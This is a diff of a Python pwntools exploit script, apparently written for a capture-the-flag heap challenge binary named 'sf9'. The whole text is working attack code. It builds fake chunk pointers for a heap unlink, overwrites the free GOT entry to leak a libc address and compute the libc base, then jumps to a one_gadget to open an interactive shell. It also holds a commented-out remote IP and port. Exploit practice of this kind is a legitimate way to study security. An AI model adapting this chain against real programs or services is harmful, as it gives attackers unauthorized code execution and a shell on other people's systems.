@@ -1,5 +1,6 @@
 from pwn import*
 p = process('./sf9')
+#p = remote('35.194.245.237',8089 )
 t = 0.05
 # gadget
 puts_plt = 0x400760
@@ -32,10 +33,11 @@ wipe(1)	# unsorted bin
 
 fake = ''
 fake += p64(0)*2
-fake += p64(0x6020D0-0x18)
-fake += p64(0x6020d0-0x10)
+fake += p64(0x6020d0-0x18)	# fake_fd
+fake += p64(0x6020d0-0x10)	# fake_bk
 fake += p8(0x20)
 keep(1,fake) 
+
 wipe(2)	# unlink !!!
 
 pay = ''
@@ -50,14 +52,18 @@ renew(1,p64(puts_plt))	# free_got = puts_plt // why using plt ?
 wipe(2)			# free(puts_got) -> puts(puts_got)
 p.recvuntil('2. Big secret\n')
 libc_puts = u64(p.recv(6).ljust(8,'\x00'))
-libc_base = libc_puts - 456336
+#libc_base = libc_puts - 456336
+libc_base = libc_puts - 456352
 libc_system = libc_base + 283536
 print 'libc_puts: '+hex(libc_puts)
+print 'libc_bae: '+hex(libc_base)
 
 #renew(1,p64(libc_system))
 #keep(2,'/bin/sh\00')
 #wipe(2)
 
-one_list = [0x45216,0x4526a,0xf02a4,0xf1147]
+#one_list = [0x45216,0x4526a,0xf02a4,0xf1147]
+one_list = [0x45216,0x4526a,0xf0364,0xf1207]
 renew(1,p64(0)+p64(libc_base+one_list[3]))
+
 p.interactive()
